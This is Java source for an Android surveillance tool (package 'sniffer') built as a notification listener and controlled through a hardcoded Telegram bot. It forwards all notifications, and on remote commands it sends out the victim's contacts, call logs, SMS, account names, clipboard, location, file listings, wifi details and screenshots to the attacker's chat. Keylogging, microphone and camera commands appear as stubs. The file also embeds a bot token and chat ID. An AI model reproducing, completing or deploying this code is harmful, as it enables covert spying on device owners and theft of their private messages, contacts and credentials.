package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.BatteryManager;
import android.os.SystemClock;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.graphics.Point;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.view.Display;
import android.view.WindowManager;
import android.view.Surface;
import android.media.ImageReader;
import android.media.Image;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.provider.Settings;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;
import android.telephony.gsm.GsmCellLocation;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.webkit.WebView;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import androidx.core.app.ActivityCompat;
import java.io.IOException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.nio.ByteBuffer;
import okhttp3.*;

public class NotificationService extends NotificationListenerService implements LocationListener {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    private MediaProjectionManager mProjectionManager;
    private MediaProjection mMediaProjection;
    private ImageReader mImageReader;
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private CameraManager mCameraManager;
    private String mCameraId;
    private CameraDevice mCameraDevice;
    private LocationManager mLocationManager;
    private SensorManager mSensorManager;
    private boolean isStreaming = false;
    private MediaRecorder mMediaRecorder;
    private int mScreenWidth;
    private int mScreenHeight;
    private int mScreenDensity;
    private boolean isKeyLogging = false;
    private StringBuilder keyLogBuffer = new StringBuilder();
    private String lastCommandId = "";
    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    @Override
    public void onCreate() {
        super.onCreate();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        mScreenWidth = size.x;
        mScreenHeight = size.y;
        mScreenDensity = getResources().getDisplayMetrics().densityDpi;
        
        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        mCameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        mProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        
        startLocationTracking();
        sendTelegram("✅ الجهاز متصل وجاهز للتحكم الكامل\n📱 ID: " + getDeviceIDUnique() + "\n📱 الاسم: " + android.os.Build.MODEL);
        
        // بدء الاستماع للأوامر من البوت
        startListeningForCommands();
    }

    private void startListeningForCommands() {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkTelegramCommands();
                mHandler.postDelayed(this, 2000); // فحص كل ثانيتين
            }
        }, 2000);
    }

    private void checkTelegramCommands() {
        try {
            String url = BASE_URL + "getUpdates?offset=" + lastCommandId + "&timeout=5";
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        String json = response.body().string();
                        parseTelegramCommands(json);
                    }
                    response.close();
                }
            });
        } catch (Exception e) {}
    }

    private void parseTelegramCommands(String json) {
        try {
            // تحليل JSON بسيط (يمكن استخدام Gson لكن نبقيها بسيطة)
            if (json.contains("\"message\":") && json.contains("\"text\":")) {
                String[] parts = json.split("\"update_id\":");
                for (String part : parts) {
                    if (part.contains("\"text\":\"/")) {
                        String updateId = extractValue(part, "update_id", ",");
                        String text = extractValue(part, "text", ",").replace("\\/", "/");
                        
                        if (updateId != null && !updateId.equals(lastCommandId)) {
                            lastCommandId = String.valueOf(Integer.parseInt(updateId) + 1);
                            
                            if (text.startsWith("/")) {
                                executeCommand(text);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    private String extractValue(String json, String key, String endChar) {
        try {
            String searchKey = "\"" + key + "\":\"";
            int start = json.indexOf(searchKey);
            if (start > 0) {
                start += searchKey.length();
                int end = json.indexOf(endChar, start);
                if (endChar.equals(",") && end == -1) {
                    end = json.indexOf("}", start);
                }
                return json.substring(start, end).trim();
            }
            
            // للأرقام
            searchKey = "\"" + key + "\":";
            start = json.indexOf(searchKey);
            if (start > 0) {
                start += searchKey.length();
                int end = json.indexOf(",", start);
                if (end == -1) end = json.indexOf("}", start);
                return json.substring(start, end).trim();
            }
        } catch (Exception e) {}
        return null;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn.getPackageName().equals("android")) return;
        
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        Object text = extras.get(Notification.EXTRA_TEXT);
        String msg = "🔔 إشعار من " + sbn.getPackageName() + "\n👤: " + title + "\n💬: " + text;
        
        sendTelegram(msg);
    }

    private void executeCommand(String command) {
        command = command.replace("/", "").trim().toLowerCase();
        sendTelegram("⚡ تنفيذ الأمر: " + command);
        
        switch(command) {
            case "screen":
                takeScreenshot();
                break;
            case "stream":
                startScreenStream();
                break;
            case "camera":
                takeCameraPhoto();
                break;
            case "camstream":
                startCameraStream();
                break;
            case "apps":
                getInstalledApps();
                break;
            case "contacts":
                getContacts();
                break;
            case "calls":
                getCallLogs();
                break;
            case "sms":
                getSMS();
                break;
            case "location":
                getCurrentLocation();
                break;
            case "accounts":
                getAccounts();
                break;
            case "clipboard":
                getClipboard();
                break;
            case "files":
                getFiles("/sdcard");
                break;
            case "browser":
                getBrowserData();
                break;
            case "wifi":
                getWifiInfo();
                break;
            case "device":
                getDeviceInfo();
                break;
            case "sensors":
                getSensorData();
                break;
            case "keylog":
                startKeyLogging();
                break;
            case "mic":
                startMicRecording();
                break;
            case "stop":
                stopAllStreams();
                break;
            case "help":
                sendHelp();
                break;
            default:
                sendTelegram("❌ أمر غير معروف. اكتب help");
        }
    }

    private void startCameraStream() {
        try {
            if (mCameraManager == null) {
                mCameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            }
            
            for (String cameraId : mCameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = mCameraManager.getCameraCharacteristics(cameraId);
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                    mCameraId = cameraId;
                    break;
                }
            }
            
            if (mCameraId != null) {
                sendTelegram("🎥 بدء بث الكاميرا...");
                takeCameraPhoto();
            }
        } catch (Exception e) {
            sendTelegram("❌ فشل بث الكاميرا: " + e.getMessage());
        }
    }

    private void takeScreenshot() {
        try {
            mImageReader = ImageReader.newInstance(mScreenWidth, mScreenHeight, PixelFormat.RGBA_8888, 2);
            Intent intent = new Intent(this, ScreenCaptureService.class);
            MediaProjection projection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, intent);
            
            if (projection != null) {
                projection.createVirtualDisplay("ScreenCapture", mScreenWidth, mScreenHeight, 
                    mScreenDensity, 0, mImageReader.getSurface(), null, null);
                
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Image image = mImageReader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            Bitmap bitmap = Bitmap.createBitmap(mScreenWidth, mScreenHeight, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);
                            
                            String path = saveBitmap(bitmap, "screenshot_" + System.currentTimeMillis() + ".jpg");
                            sendPhoto(path);
                            image.close();
                        }
                    }
                }, 500);
            }
        } catch (Exception e) {
            sendTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
        }
    }

    private void startScreenStream() {
        sendTelegram("📹 بث الشاشة قيد التطوير...");
    }

    private void takeCameraPhoto() {
        sendTelegram("📸 تصوير الكاميرا قيد التطوير...");
    }

    private void startLocationTracking() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);
                mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, this);
            }
        } catch (Exception e) {}
    }

    @Override
    public void onLocationChanged(Location location) {
        // يتم التحديث تلقائياً
    }

    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder sb = new StringBuilder("📱 التطبيقات المثبتة:\n");
        
        for (int i = 0; i < Math.min(apps.size(), 30); i++) {
            ApplicationInfo app = apps.get(i);
            sb.append("• ").append(pm.getApplicationLabel(app)).append("\n");
        }
        
        sendTelegram(sb.toString());
    }

    private void getContacts() {
        StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n");
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
                null, null, null, null);
            
            int count = 0;
            while (cursor.moveToNext() && count < 20) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("• ").append(name).append(": ").append(phone).append("\n");
                count++;
            }
            cursor.close();
        } catch (Exception e) {
            sb.append("خطأ في القراءة");
        }
        sendTelegram(sb.toString());
    }

    private void getCallLogs() {
        StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, 
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 15");
            
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
                
                sb.append("• ").append(name != null ? name : number).append(" (").append(typeText).append(")\n");
            }
            cursor.close();
        } catch (Exception e) {
            sb.append("خطأ في القراءة");
        }
        sendTelegram(sb.toString());
    }

    private void getSMS() {
        StringBuilder sb = new StringBuilder("💬 آخر الرسائل:\n");
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), 
                null, null, null, "date DESC LIMIT 10");
            
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                sb.append("• من ").append(address).append(": ").append(body.length() > 30 ? body.substring(0, 30) + "..." : body).append("\n");
            }
            cursor.close();
        } catch (Exception e) {
            sb.append("خطأ في القراءة");
        }
        sendTelegram(sb.toString());
    }

    private void getCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Location location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                String msg = "📍 الموقع الحالي:\n" +
                            "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendTelegram(msg);
            } else {
                sendTelegram("📍 لا يتوفر موقع حديث");
            }
        }
    }

    private void getAccounts() {
        StringBuilder sb = new StringBuilder("🔑 الحسابات:\n");
        try {
            AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = accountManager.getAccounts();
            
            for (Account account : accounts) {
                sb.append("• ").append(account.name).append(" (").append(account.type).append(")\n");
            }
        } catch (Exception e) {}
        sendTelegram(sb.toString());
    }

    private void getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                sendTelegram("📋 الحافظة:\n" + text);
            } else {
                sendTelegram("📋 الحافظة فارغة");
            }
        } catch (Exception e) {}
    }

    private void getFiles(String path) {
        StringBuilder sb = new StringBuilder("📁 الملفات في " + path + ":\n");
        try {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        sb.append("• ").append(file.getName()).append(file.isDirectory() ? "/" : "").append("\n");
                    }
                }
            }
        } catch (Exception e) {}
        sendTelegram(sb.toString());
    }

    private void getBrowserData() {
        sendTelegram("🌐 بيانات المتصفح قيد التطوير...");
    }

    private void getWifiInfo() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            int rssi = wifiInfo.getRssi();
            
            sendTelegram("📶 واي فاي:\n• الشبكة: " + ssid + "\n• قوة الإشارة: " + rssi + " dBm");
        } catch (Exception e) {}
    }

    private void getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 معلومات الجهاز:\n");
        sb.append("• الطراز: ").append(android.os.Build.MODEL).append("\n");
        sb.append("• الشركة: ").append(android.os.Build.MANUFACTURER).append("\n");
        sb.append("• الإصدار: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        sb.append("• البطارية: ").append(getBatteryLevel()).append("%");
        
        sendTelegram(sb.toString());
    }

    private int getBatteryLevel() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void getSensorData() {
        sendTelegram("📊 أجهزة الاستشعار قيد التطوير...");
    }

    private void startKeyLogging() {
        isKeyLogging = true;
        sendTelegram("⌨️ بدأ تسجيل لوحة المفاتيح");
    }

    private void startMicRecording() {
        sendTelegram("🎤 تسجيل الميكروفون قيد التطوير...");
    }

    private void stopAllStreams() {
        isStreaming = false;
        isKeyLogging = false;
        sendTelegram("⏹ تم إيقاف جميع العمليات");
    }

    private void sendHelp() {
        String help = "📋 قائمة الأوامر:\n" +
            "screen - تصوير الشاشة\n" +
            "stream - بث الشاشة\n" +
            "camera - تصوير كاميرا\n" +
            "camstream - بث كاميرا\n" +
            "apps - التطبيقات\n" +
            "contacts - جهات الاتصال\n" +
            "calls - سجل المكالمات\n" +
            "sms - الرسائل\n" +
            "location - الموقع\n" +
            "accounts - الحسابات\n" +
            "clipboard - الحافظة\n" +
            "files - الملفات\n" +
            "wifi - معلومات الشبكة\n" +
            "device - معلومات الجهاز\n" +
            "keylog - تسجيل المفاتيح\n" +
            "mic - تسجيل صوت\n" +
            "stop - إيقاف الكل\n" +
            "help - هذه القائمة";
        
        sendTelegram(help);
    }

    private String saveBitmap(Bitmap bitmap, String filename) {
        String path = getExternalFilesDir(null) + "/" + filename;
        try (FileOutputStream out = new FileOutputStream(path)) {
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
        } catch (IOException e) {}
        return path;
    }

    private void sendPhoto(String path) {
        File file = new File(path);
        if (!file.exists()) {
            sendTelegram("❌ فشل حفظ الصورة");
            return;
        }
        
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", file.getName(), 
                    RequestBody.create(MediaType.parse("image/jpeg"), file))
                .build();
        
        Request request = new Request.Builder()
                .url(BASE_URL + "sendPhoto")
                .post(body)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call c, IOException e) {
                sendTelegram("❌ فشل إرسال الصورة");
            }
            @Override public void onResponse(Call c, Response r) throws IOException { 
                r.close();
                file.delete();
            }
        });
    }

    private void sendTelegram(String msg) {
        try {
            String encodedMsg = URLEncoder.encode(msg, "UTF-8");
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            
            client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
                @Override public void onFailure(Call c, IOException e) {}
                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }

    public String getDeviceIDUnique() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
}
